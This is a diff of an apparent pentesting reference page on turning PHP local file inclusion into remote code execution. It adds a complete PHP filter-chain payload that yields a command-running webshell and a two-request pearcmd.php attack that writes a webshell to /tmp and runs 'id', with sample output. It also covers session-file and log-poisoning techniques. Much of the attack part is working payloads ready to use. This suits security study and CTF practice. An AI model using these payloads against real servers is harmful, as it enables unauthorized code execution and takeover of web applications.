@@ -158,7 +158,7 @@ http://$YOUR_IP/shell.php
 ```
 {% endcode %}
 
-However, in more recent versions of PHP, the `allow_url_include=` option which enables some of these wrappers is **disabled by default**. However, there is a really powerful technique that I came across recently [found by loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) which combines lots of PHP filters to turn any file into arbitrary PHP code. For this, you only need to have **control of the start** to allow PHP wrappers, and then have a valid file anywhere to transform into PHP code. But you'll have a valid file anyways from the default functionality of the site, so this is pretty much a guarantee.&#x20;
+However, in more recent versions of PHP, the `allow_url_include=` option which enables some of these wrappers is **disabled by default**. However, there is a really powerful technique that I came across recently [found by loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) which combines lots of PHP filters to turn any file into arbitrary PHP code. For this, you only need to have **control of the start** to allow PHP wrappers, and then have a valid file anywhere to transform into PHP code. But you'll have a valid file anyway from the default functionality of the site, so this is pretty much a guarantee.&#x20;
 
 {% code title="Example vulnerable code" %}
 ```php
@@ -233,19 +233,90 @@ r = requests.get(url, params={
 print(r.text)
 ```
 
-For arbitrary contents instead of just the ``<?=`$_GET[0]`;;?>`` needed here, check out the [list of all base64 characters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters#improvements) that Carlos Polop made.&#x20;
+For arbitrary contents instead of just the ``<?=`$_GET[0]`;;?>`` needed here, check out the [list of all base64 characters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters#improvements) that Carlos Polop made. Synacktiv later also made a tool that automates it:
 
-### RCE using Session
+{% embed url="https://github.com/synacktiv/php_filter_chain_generator" %}
+Tool to quickly generate PHP filter chains with arbitrary content
+{% endembed %}
 
-Another way is using PHP sessions, which store your session data in `/tmp/sess_[PHPSESSID]` which you can access using your own `PHPSESSID=` cookie on the site. Anything saved to `$_SESSION[]` in the code will be saved to this file. If you put PHP code into your session and include it, the PHP code will be executed
+<details>
+
+<summary>Payload: <code>&#x3C;?=`$_GET[0]`?></code></summary>
+
+{% code overflow="wrap" %}
+```bash
+?0=id&page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+```
+{% endcode %}
+
+</details>
+
+### RCE using `pearcmd.php`
+
+Recently a new technique was developed for cases where you **don't control the start** of the `include` path. In such cases, you cannot use wrappers, but directory traversal using `../` is still possible. This opens up the possibility of using other existing PHP files on the system to execute arbitrary code, which the following writeup found a technique for:
+
+{% embed url="https://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=nl&_x_tr_pto=wapp#0x06-pearcmdphp" %}
+Using `pearcmd.php` to get RCE from local file inclusion through directory traversal
+{% endembed %}
+
+{% code title="Vulnerable code" %}
+```php
+<?php
+include 'includes/' . $_GET['page'] . '.php';
+```
+{% endcode %}
+
+This technique is especially useful if `.php` is **appended** to your input like many `?page=` parameters. Because the `/usr/local/lib/php/pearcmd.php` file fits this requirement it is very usable. To interact with this script we use the query string which is passed as command-line arguments. The `config-create` subcommand allows us to write a file anywhere with some content we control, perfect for writing a webshell!
+
+Even if the user has **no write privileges to the webroot**, we already have a directory traversal on the include function to be able to do this in the first place, so we can re-use it later to include the file we write executing the payload. We will write it to the `/tmp` folder with a simple shell that runs the `?0=` parameter as a system command:
+
+{% code title="/tmp/shell.php" %}
+```php
+<?=`$_GET[0]`?>
+```
+{% endcode %}
+
+Note that the config file we will write contains this string multiple times, so the command is executed and its output is included in the response multiple times. We first use the directory traversal to include the `pearcmd.php` file and write the config with a PHP shell:
+
+{% code title="Request 1" overflow="wrap" %}
+```http
+GET /?+config-create+/&page=../../../../usr/local/lib/php/pearcmd&/<?=`$_GET[0]`?>+/tmp/shell.php HTTP/1.1
+Host: localhost
+```
+{% endcode %}
+
+You should receive a verbose `CONFIGURATION ...` response if this was successful. Then the only thing left to do is execute our written webshell with the same vulnerability:
+
+{% code title="Request 2" %}
+```http
+GET /?page=../../../../tmp/shell&0=id HTTP/1.1
+Host: localhost:8000
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+#PEAR_Config 0.9
+a:13:{s:7:"php_dir";s:70:"/&page=../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
+...
+```
+{% endcode %}
+
+{% hint style="warning" %}
+**Note**: The `/usr/local/lib/php/pearcmd.php` file we abuse here does not exist on all setups. It is included in PHP < 7.3 by default, and version > 7.4 if the `--with-pear` option was used to compile it. Any _official docker image_ however does include it, so in many instances, you will find this file.
+{% endhint %}
+
+### RCE using Session file
+
+Another way is using PHP sessions, which store your session data in `/tmp/sess_[PHPSESSID]` which you can access using your own `PHPSESSID=` cookie on the site. Anything saved to `$_SESSION[]` in the code will be saved to this file. If you put PHP code into your session and include it, the PHP code will be executed.
 
 {% embed url="https://jorianwoltjer.com/blog/post/ctf/cyber-apocalypse-2021/extortion" %}
-A short writeup showing this attack in practice
+A short writeup showing this attack in practice (fun fact, my first ever blog post!)
 {% endembed %}
 
 ### RCE using logs
 
-You can include log files with your input in them, which can contain PHP code to be executed on include. The `User-Agent` is often saved to logs
+You can include log files with your input in them, which can contain PHP code to be executed on include. The `User-Agent` is often saved to logs:
 
 {% code title="Common log file locations" %}
 ```
@@ -255,7 +326,7 @@ You can include log files with your input in them, which can contain PHP code to
 ```
 {% endcode %}
 
-If you can't find the logs you might be able to find it by looking at the configuration of the server, you can include/read any file after all
+If you can't find the logs you might be able to find it by looking at the configuration of the server, you can include/read any file after all:
 
 {% code title="Common config file locations" %}
 ```
@@ -267,17 +338,3 @@ If you can't find the logs you might be able to find it by looking at the config
 /usr/local/etc/httpd/httpd.conf
 ```
 {% endcode %}
-
-## Tricks
-
-Any interesting tricks that are PHP specific
-
-### Parameter filter bypass
-
-{% embed url="https://www.idontplaydarts.com/2013/06/http-parameter-pollution-with-cookies-in-php/" %}
-
-PHP turns `[` into `_` with the `parse_str` function. This can bypass checks looking for a name with an underscore. (Also works with cookies, which can even permanently overwrite cookies)
-
-```
-user_id=123&user[id=456
-```
